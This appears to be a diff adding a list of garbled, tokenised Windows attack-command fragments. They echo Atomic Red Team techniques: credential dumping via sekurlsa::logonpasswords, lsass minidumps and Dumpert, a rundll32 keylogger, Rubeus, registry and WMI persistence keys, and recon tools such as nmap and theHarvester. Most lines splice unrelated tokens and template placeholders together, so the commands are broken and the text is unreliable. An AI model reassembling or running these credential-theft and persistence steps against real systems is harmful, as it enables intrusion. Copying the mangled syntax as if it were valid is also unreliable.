@@ -1,0 +1,64 @@
+hydra as -sc c i+= $ { command } ''
+nmap -- \\ $ } nt\currentversion\winlogon } bookmarks
+get-ciminstance advfirewall localappdata $ ( targetinstance.systemuptime state
+wscript $ } $ { domain }
+c hkcu\environment root\subscription '' /t reg_sz -value `` : reg_dword /t reg_sz /d `` $ { dll_file_path } '' /f
+% opmode -command controllers '' disable
+cmdkey /list
+computername= $ { -userprincipalname `` output_file } -w `` threadingmodel '' '' /launch : 0 /f
+rundll32 keylogger_dll.dll , keylog
+theharvester -d $ { file_name } , $ { binary } ''
+net group /f $ { docm }
+nslookup $ { lsass_lib.dll_path } $ { mask }
+create % \secrets -loadandrundiagscriptnocab
+reg add `` bits_job_name } ''
+python zero_padding.py $ { domain }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` c : command '' '' /v `` atomictest.dll '' /t reg_sz /f
+copy `` user_name : /domain
+netsh.exe add add `` image_file_name '' /d dllname /d `` $ { output_zip } ''
+rundll32.exe -arguments $ { registry_path }
+sekurlsa : :logonpasswords
+auditpol iwr $ env cmdkey.exe { ip
+wt.exe $ { password } , $ { timeout }
+reg add `` hklm\software\microsoft\command \users\ : '' `` $ { ip }
+colorcpl $ { input_folder_name } '' $ { url }
+vshadow - $ uesr
+gobuster reg add `` hklm\system\currentcontrolset\control\session nt\currentversion\winlogon '' /v `` { anything } ''
+$ filtertoconsumerbinding = new-object options\spoolsv.exe '' account `` $ { command } '' -propertytype `` $ { command }
+.\tshark -t -u $ { //raw.githubusercontent.com/s3cur3th1ssh1t full
+new-object rubeus.exe
+reg add `` hkey_local_machine\system\currentcontrolset\control\session '' execution setup\installed \updater.exe -command $ { binary_file_path } full
+tracert $ 5
+videocap.exe -u $ { domain } -a $ { local_file_path }
+get-localgroupmember trace
+% ) -sc $ { output_path }
+nmap /resume | -verbose '' `` $ { dll_file_path }
+schtasks /create defaultaccount
+remove-item $ % = c ( minidump ( execution \microsoft\teams\current\teams.exe bookmarks
+computername= $ { domain } '' -force
+% /category /a
+reg add `` hklm\software\microsoft\windows /v hkcu\software\classes\clsid\ { filename_regex } ''
+copy $ env : rename :minidump = execution :tls12
+ren $ { malicious_binary } -w i /every $ { username } '' { message } -n $ { command }
+`` add : execution \windows\system32\desk.cpl objws $ _ '' /v `` $ { dll_file_path } '' '
+namp $ `` hkcu\software\microsoft\windows hklm\software\microsoft\windows nt\currentversion\windows '' /v '' '' /v reg_sz /f
+reg add `` hklm\software\microsoft\windows file `` -asplaintext `` -lt administrators -name threadingmodel '' '' /v `` cor_enable_profiling '' /v ntds.dit $ { lsass_pid }
+.\get-keystrokes.ps1 $ { command }
+reg add `` cor_profiler_path $ { vulnerable_version_of_amsi.dll } '' reportingmode invoke-portscan ' you ( $ ( `` .\auto_collection.ps1 & ' /krbtgt ( $ ( `` '' root\subscription '' 5
+reg add hkcu\environment /t globalflag /d `` cor_profiler '' /v 1 /t reg_sz /d $ { dll_file_path }
+auditpol localappdata % \system32\osk.exe : = 1 $ i $ { command_file }
+localbrute `` source_file '' /domain
+whoami
+put $ { name='atomicredteam-wmipersistence-activescripteventconsumer-example ' ) /f
+subfinder -d $ { task_name } '' '' `` $ { password } ''
+tasklist
+auditpol cmdkey /list
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' c userinitmprlogonscript /f
+.\outflank-dumpert.exe dump
+unregmp2.exe /hidewmp and
+sc /hidewmp
+vsdiagnostics.exe start = `` flie_name
+out-minidump.exe
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /t reg_sz /d `` c : /t logon -value `` $ { dll_file_path } '' /t output_filename
+windir `` source_file_path -accepteula ( $ [ net.servicepointmanager ] : lsass.exe c : \microsoft\teams\current\teams.exe
+reg add `` hklm\software\microsoft\command nt\currentversion\image ' '' options\spoolsv.exe '' /t reg_expand_sz /d `` $ { dll_file_path } '' /f
